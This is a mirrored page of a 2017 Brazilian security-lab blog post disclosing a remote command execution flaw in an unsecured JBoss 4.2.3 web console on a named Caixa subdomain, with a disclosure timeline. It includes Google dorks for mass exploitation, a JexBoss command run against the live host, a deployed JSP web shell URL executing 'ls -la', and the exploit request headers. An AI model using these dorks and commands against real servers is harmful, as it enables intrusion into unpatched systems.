@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 15 Nov 2017 18:53:34 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Remote Command Execution on Jboss - Banking hacking - Caixa</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="../favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="../assets/css/screen66a1.css?v=89ed80cff4" />
+    <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    
+    <meta property="og:site_name" content="InsightL4b - Security Research Lab" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Remote Command Execution on Jboss - Banking hacking - Caixa" />
+    <meta property="og:description" content="Basicamente a vulnerabilidade é um RCE que se encontra no sistema GRF Recursal da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada" />
+    <meta property="og:url" content="index.html" />
+    <meta property="og:image" content="../content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png" />
+    <meta property="article:published_time" content="2017-05-03T16:07:27.000Z" />
+    <meta property="article:modified_time" content="2017-05-05T00:21:19.000Z" />
+    <meta property="article:tag" content="hacking" />
+    <meta property="article:tag" content="caixa" />
+    <meta property="article:tag" content="rce" />
+    <meta property="article:tag" content="jboss" />
+    <meta property="article:tag" content="exploit" />
+    <meta property="article:tag" content="vulnerabilidade" />
+    <meta property="article:tag" content="remote code execution" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/insightsecbr" />
+    <meta property="article:author" content="https://www.facebook.com/JhonVipNet" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Remote Command Execution on Jboss - Banking hacking - Caixa" />
+    <meta name="twitter:description" content="Basicamente a vulnerabilidade é um RCE que se encontra no sistema GRF Recursal da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada" />
+    <meta name="twitter:url" content="index.html" />
+    <meta name="twitter:image" content="../content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Jhonathan Davi" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="hacking, caixa, rce, jboss, exploit, vulnerabilidade, remote code execution" />
+    <meta name="twitter:site" content="@jh00nbr" />
+    <meta name="twitter:creator" content="@jh00nbr" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "InsightL4b - Security Research Lab",
+        "logo": "http://lab.insightsecurity.com.br/ghost/img/ghosticon.jpg"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Jhonathan Davi",
+        "image": "http://lab.insightsecurity.com.br/content/images/2016/08/IMG_20160701_160800.jpg",
+        "url": "http://lab.insightsecurity.com.br/author/jhonathan_davi/",
+        "sameAs": [
+            "http://jhonathandavi.com.br/",
+            "https://www.facebook.com/JhonVipNet",
+            "https://twitter.com/jh00nbr"
+        ],
+        "description": "Jhonathan Davi A.K.A jh00nbr"
+    },
+    "headline": "Remote Command Execution on Jboss - Banking hacking - Caixa",
+    "url": "https://lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/",
+    "datePublished": "2017-05-03T16:07:27.000Z",
+    "dateModified": "2017-05-05T00:21:19.000Z",
+    "image": "http://lab.insightsecurity.com.br/content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png",
+    "keywords": "hacking, caixa, rce, jboss, exploit, vulnerabilidade, remote code execution",
+    "description": "Basicamente a vulnerabilidade é um RCE que se encontra no sistema GRF Recursal da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.9" />
+    <link rel="alternate" type="application/rss+xml" title="InsightL4b - Security Research Lab" href="../rss/index.html" />
+</head>
+<body class="post-template tag-hacking tag-caixa tag-rce tag-jboss tag-exploit tag-vulnerabilidade tag-remote-code-execution nav-closed">
+
+    <div class="nav">
+    <h3 class="nav-title">Menu</h3>
+    <a href="#" class="nav-close">
+        <span class="hidden">Close</span>
+    </a>
+    <ul>
+            <li class="nav-home" role="presentation"><a href="../index.html">Home</a></li>
+            <li class="nav-page-fb" role="presentation"><a href="https://www.facebook.com/insightsecbr/">Page FB</a></li>
+            <li class="nav-facebook" role="presentation"><a href="http://fb.com/JhonVipNet">Facebook</a></li>
+            <li class="nav-github" role="presentation"><a href="https://github.com/jh00nbr">Github</a></li>
+            <li class="nav-aboutme" role="presentation"><a href="http://jhonathandavi.com.br/">About-me</a></li>
+    </ul>
+        <a class="subscribe-button" href="../subscribe/index.html">Subscribe</a>
+</div>
+<span class="nav-cover"></span>
+
+
+    <div class="site-wrapper">
+
+        
+
+
+<header class="main-header post-head " style="background-image: url(../content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png)">
+    <nav class="main-nav overlay clearfix">
+        
+            <a class="menu-button icon-menu" href="#"><span class="word">Menu</span></a>
+    </nav>
+</header>
+
+<main class="content" role="main">
+    <article class="post tag-hacking tag-caixa tag-rce tag-jboss tag-exploit tag-vulnerabilidade tag-remote-code-execution">
+
+        <header class="post-header">
+            <h1 class="post-title">Remote Command Execution on Jboss - Banking hacking - Caixa</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2017-05-03">03 May 2017</time>  on <a href="../tag/hacking/index.html">hacking</a>, <a href="../tag/caixa/index.html">caixa</a>, <a href="../tag/rce/index.html">rce</a>, <a href="../tag/jboss/index.html">jboss</a>, <a href="../tag/exploit/index.html">exploit</a>, <a href="../tag/vulnerabilidade/index.html">vulnerabilidade</a>, <a href="../tag/remote-code-execution/index.html">remote code execution</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <p>Basicamente a vulnerabilidade é um RCE que se encontra no sistema <strong>GRF Recursal</strong> da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada logo após a transmissão do arquivo SEFIP.</p>
+
+<blockquote>
+  <p><code>* <b>Sub domain:</b> http://www.grfrecursal.caixa.gov.br</code><br><code>* <b>Jboss Version vulnerable:</b> 4.2.3.GA</code> <br />
+  <code>* <b>OS: </b>Linux 2.6.32-431.11.2.el6.x86<em>64 (amd64)</code> <br />
+  <code>* <b>URI: </b>http://www.grfrecursal.caixa.gov.br/web-console/</code><br><code>* <b>System info:</b> Linux aa0000vx056 2.6.32-431.11.2.el6.x86</em>64 #1 SMP Mon Mar 3 13:32:45 EST 2014 x86<em>64 x86</em>64 x86_64 GNU/Linux </code> <br />
+  <code><b>Documentation:</b></code> <a href="https://developer.jboss.org/">https://developer.jboss.org</a></br></br></p>
+</blockquote>
+
+<p><img width="300px" src="../../2.bp.blogspot.com/-xGy919BMJkM/Uo4h1tgpTyI/AAAAAAAAY5U/Kd9_6rKnQHw/s1600/Critical%20vulnerability%20in%20JBoss%20Application%20Servers%20enables%20remote%20Shell.png"></img> <br />
+The JBoss Application Server (JBoss AS) is a widely used, open source Java application server. It is part of the JBoss Enterprise Middleware Suite (JEMS) and often used in large enterprise installations.  The JBoss AS allows the development and deployment of Java Platform, Enterprise Edition (JEE) applications, web applications and portals. JBoss AS installations can be found in a variety of environments, ranging from large enterprises’ classic web sites over client-server installations for business software up to control applications for telephone systems. This means that many organisations have JBoss AS installations without knowing exactly how they work.</p>
+
+<p><img width="600px" src="../../i.imgur.com/cmm0hZP.png"></img></p>
+
+<p><code><b>Web-console</b></code>: The Web console can be used to display the JNDI tree, dump the list of threads, redeploy an application or even shutdown the application server. By default, the console is not secured and can be used by remote attackers. Check References for detailed information.</p>
+
+<p><code><b>Web-console/Invoker ~> www.grfrecursal.caixa.gov.br/web-console/Invoker</b></code></p>
+
+<p><img width="600px" src="../../i.imgur.com/fHu8kiW.png"></img></p>
+
+<p><b>Detecting Jboss:</b></p>
+
+<p>JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.</p>
+
+<ul>
+<li><b>Tool JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and Exploitation Tool:</b> <a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></li>
+</ul>
+
+<blockquote>
+  <p><b>Mass exploitation - Dorks:</b><br><br>
+  <b>Intitle:</b> ”jboss management console” “application server” version inurl:”web-console”<br><b>intitle: </b>”JBoss Management Console – Server Information” “application server”<br>inurl:”web-console” OR inurl:”jmx-console” <br />
+  <b>inurl:</b> "/web-console/Invoker"<br><b>References:</b> <a href="http://blog.inurl.com.br/2015/06/jexboss-jboss-verify-tool-inurlbr-mass.html">http://blog.inurl.com.br/2015/06/jexboss-jboss-verify-tool-inurlbr-mass.html</a><br><a href="http://blog.inurl.com.br/2015/06/jboss-seam-2-remote-command-execution.html">http://blog.inurl.com.br/2015/06/jboss-seam-2-remote-command-execution.html</a></p>
+</blockquote>
+
+<p><b>Exploiting</b></p>
+
+<p><code>* ./jexboss.py -u http://www.grfrecursal.caixa.gov.br/ --cmd ls</code><br> <code>* Remote shell:</code> www.grfrecursal.caixa.gov.br/jexws3/jexws3.jsp?ppp=ls%20-la </p>
+
+<p><img width="600px" src="../../i.imgur.com/5mqrTjf.png"></img> <br />
+<img width="600px" src="../../i.imgur.com/dvhr4rr.png"></img></p>
+
+<blockquote>
+  <p><center><b>Payload</b></center><br> <br />
+  <code>POST /web-console/Invoker HTTP/1.1<br>Host: www.grfrecursal.caixa.gov.br<br>Accept-Encoding: identity<br>Content-Length: 574<br>Connection: keep-alive<br>Content-Type: application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation<br>Accept: text/html, image/gif, image/jpeg, <em>; q=.2, */</em>; q=.2<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0 </code><br> <br />
+  <img width="700px" src="../../i.imgur.com/v5lF6ZP.png"></img>  </p>
+</blockquote>
+
+<p><center><b>Responsible disclosure</b></center></p>
+
+<blockquote>
+  <p><b>Notificação:</b> 02/05/2017<br>
+   <b>Resposta do responsável:</b> 02/05/2017<br>
+   <b>Correção:</b> 02/05/2017<br>
+   <b>Data de postagem:</b> 03/05/2017
+  <img width="700px" src="../../i.imgur.com/n9h8aCS.png"></img></p>
+</blockquote>
+
+<p><b>References:</b></p>
+
+<ul>
+<li><a href="https://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper">https://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper</a><em>Whos-the-JBoss-now</em>RedTeam-Pentesting_EN.pdf</li>
+<li><a href="https://media.blackhat.com/bh-eu-10/presentations/Papathanasiou/BlackHat-EU-2010-Papathanasiou-Abusing-JBoss-slides.pdf">https://media.blackhat.com/bh-eu-10/presentations/Papathanasiou/BlackHat-EU-2010-Papathanasiou-Abusing-JBoss-slides.pdf</a></li>
+<li><a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Krpata/DEFCON-18-Krpata-Attacking-JBoss.pdf">https://www.defcon.org/images/defcon-18/dc-18-presentations/Krpata/DEFCON-18-Krpata-Attacking-JBoss.pdf</a> </li>
+</ul>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Sr8ILq1a_yw" frameborder="0" allowfullscreen></iframe>
+
+<p><center> <b>gr33tz:</b> Marcos Abreu e Vinícius Leão</center></p>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="../author/jhonathan_davi/index.html" style="background-image: url(../content/images/2016/08/IMG_20160701_160800.jpg)"><span class="hidden">Jhonathan Davi's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="../author/jhonathan_davi/index.html">Jhonathan Davi</a></h4>
+
+                    <p>Jhonathan Davi A.K.A jh00nbr</p>
+                <div class="author-meta">
+                    <span class="author-location icon-location">Brasília</span>
+                    <span class="author-link icon-link"><a href="http://jhonathandavi.com.br/">http://jhonathandavi.com.br/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/intent/tweet?text=Remote%20Command%20Execution%20on%20Jboss%20-%20Banking%20hacking%20-%20Caixa&amp;url=https://lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+            <section class="gh-subscribe">
+                <h3 class="gh-subscribe-title">Subscribe to InsightL4b - Security Research Lab</h3>
+                <p>Get the latest posts delivered right to your inbox.</p>
+                <form method="post" action="https://lab.insightsecurity.com.br/subscribe/" class="">
+    <input class="confirm" type="hidden" name="confirm"  /><input class="location" type="hidden" name="location"  /><input class="referrer" type="hidden" name="referrer"  />
+
+    <div class="form-group">
+        <input class="subscribe-email" type="email" name="email"  placeholder="Your email address" />
+    </div>
+    <button class="" type="submit">Subscribe</button>
+    <script type="text/javascript">(function(g,h,o,s,t){h[o]('.location')[s]=h[o]('.location')[s] || g.location.href;h[o]('.referrer')[s]=h[o]('.referrer')[s] || h.referrer;})(window,document,'querySelector','value');</script>
+</form>
+
+
+                <span class="gh-subscribe-rss">or subscribe <a href="http://cloud.feedly.com/#subscription/feed/http://lab.insightsecurity.com.br/rss/">via RSS</a> with Feedly!</span>
+            </section>
+
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '../../insightl4b.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                
+
+
+        </footer>
+
+    </article>
+</main>
+
+
+
+
+<aside class="read-next">
+    <a class="read-next-story " style="background-image: url(../content/images/2017/10/phishruffus.png)" href="../phishruffus-intelligent-threat-hunter-and-phishing-servers/index.html">
+        <section class="post">
+            <h2>Phishruffus - Intelligent threat hunter and phishing servers</h2>
+            <p>O Phishruffus é uma ferramenta projetada para a identificação de ameaças e servidores DNS maliciosos na internet que são&hellip;</p>
+        </section>
+    </a>
+    <a class="read-next-story prev " style="background-image: url(../content/images/2016/12/bug-bounty.jpg)" href="../school-hacking-vulnerabilidade-aplicativo-academico-total/index.html">
+        <section class="post">
+            <h2>School Hacking - Vulnerabilidade aplicativo Academico Total</h2>
+            <p>" Continuando a série de pesquisas de segurança e levantamentos de vulnerabilidades em aplicativos mobile " " No seu tempo de ensino&hellip;</p>
+        </section>
+    </a>
+</aside>
+
+
+
+        <footer class="site-footer clearfix">
+            <section class="copyright"><a href="../index.html">InsightL4b - Security Research Lab</a> &copy; 2017</section>
+            <section class="poweredby">Proudly published with <a href="https://ghost.org/">Ghost</a></section>
+        </footer>
+
+    </div>
+
+    <script type="text/javascript" src="../../code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','../../www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-66822614-6', 'auto');
+  ga('send', 'pageview');
+
+</script>
+    <script type="text/javascript" src="../assets/js/jquery.fitvids66a1.js?v=89ed80cff4"></script>
+    <script type="text/javascript" src="../assets/js/index66a1.js?v=89ed80cff4"></script>
+
+</body>
+
+<!-- Mirrored from lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 15 Nov 2017 18:54:07 GMT -->
+</html>
